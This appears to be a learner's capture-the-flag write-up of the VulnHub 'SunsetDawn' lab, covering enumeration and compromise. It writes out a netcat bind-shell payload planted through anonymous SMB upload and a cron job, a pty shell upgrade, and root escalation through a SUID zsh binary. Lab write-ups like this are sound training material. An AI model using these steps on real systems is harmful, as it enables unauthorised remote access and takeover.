@@ -1,0 +1,74 @@
+***VULNHUB:SUNSETDAWN:WRITEUP***
+
+ENUMERATION
+ * nmap 192.168.56.1/24 
+   * 192.168.56.103
+   * Port 80 http
+   * Port 139 netbiod-ssn 
+   * Port 445 microsoft-ds
+   * Port 3306 mysql
+
+ * sudo nmap -v -sS -A -Pn -T5 -p- -oN extendedscan.txt 192.168.56.103
+   * Port 80 Apache 2.4.38
+   * Port 139 netbios-ssn Samba smbd 3.x-4.x
+   * Port 445 netbiod-ssn Samba smbd 4.9.5-Debian
+   * Port 3306 mysql MySQL 5.5.5-10.3.15-MariaDB-1
+   * OS: Linux 3.2-4.9
+ 
+ * TAKEAWAYS
+   * It seems as though I'm dealing with a Debian Linux fileshare server. 
+   * I get some windows flags from other parts of my second nmap scan (which i ommited due to confusing details), but I plan on overlooking these as I think they're false positives due to the smbd protocols beings used.
+
+PLAN OF ATTACK
+ * I will reserach into the MariaDB and Samba details left within the nmap report.
+ * Both have a great amount of detail and potential to be vulnerable.
+
+ATTACKING MARIABDB
+ * Found an exploit from ExploitDB. CVE:2016-6662.
+   * Began learning and troubleshooting it. Finally got code to run without error, when a usage warning informed me that I needed Database credentials in order to run the script. 
+   * I don't have this sort of information, so I'll have to shelf this indefinitely.
+ * I feel as though I'll run into more authentication issues like this while attacking a database, so I'll move on to attack Samba instead.
+
+
+ATTACKING SAMBA
+ * Tried two exploits. First require packages installed that are not installed. Not installing properly when attempted. Second had strange usage that did not work in an intuitive way. Could not make much progress with it.
+
+ENUMERATION
+ * Tried navigating to the server via browser. Was greeted with a basic HTML page saying that the page was under construction. 
+ * Page may contain some hints. Told viewer not to use webpage if not affiliated with the company. However I could not find any data input fields, or any data I could manipulate. Might be worth targetting with Dirbuster:
+ * Found one directory, called /logs. After navigating to it, i was greeted with 4 log files, all of which were unaccessable except one. The one that allowed me to download it was called 'Management.log'.
+ * I downloaded 'Management.log' and read through it. I noticed there were two users: ITDEPT and ganimedes. I decided to store this information for later. 
+
+PLAN OF ATTACK
+ * At this point I admitted to myself I didn't know what to do with this information, so I decided to look towards some online guides. 
+ * The guide I found had followed the same path as me, but then continued to the end.
+ * I was pointed towards attacking the Samba SMB services again. They concentrated on enumeration and attack using smbmap and smbclient. 
+ * smbmap listed out the share drives available at the target IP address (which included ITDEPT)
+ * smbclient allowed me to enter the fileshare server as root using anonymous login.
+
+ATTACKING SAMBA
+ * I enumnerated the fileshare using smbmap, and learned that an ITDEPT directory existed which i could enter through later.
+ * Created a reverse shell payload to upload
+   * Earlier within 'Management.log' it was noted that a crontab ran periodically that ran any file named 'web-control' or 'product-control'.
+   * So I created a file with a reverse shell bash script, and named it 'web-contorl'. (And did the same for 'product-control'
+   * Command used: echo "nc -e /bin/bash -lvp 1234 &" > web-control
+ * Entered the fileshare as root with smbclient, using anonymous login for password.
+ * Uploaded 'web-control' and 'product-control' using the 'put' command.
+ * Exited the server, and opened up a netcat listener port
+   * Command used: nc target.IP.address 1234
+ * Recieved a basic shell!
+
+PRIVELAGE ESCALATION
+ * I am now on the sever, however I've got a blank shell and do not have root privelages yet.
+ * I run 'whoami' and learn that I am 'dawn'.
+ * I run a python one-liner in order to recieve a proper shell
+   * Command used: python -c 'import pty;pty.spawn("/bin/bash")'
+ * Now that I have a proper shell, I can see that I am the user 'dawn'.
+ * I enumerate for binaries that have SUID permissions
+   * Command used: find / -perm -u=s -type f 2>/dev/null
+ * I am given a list of binaries, one of which is a zsh shell.
+ * I run the zsh binary, and run 'whoami'
+ * I am now root.
+ * I navigate to the /root directory, and list the contents. 'flag.txt' appears.
+
+BOX IS NOW OWNED.
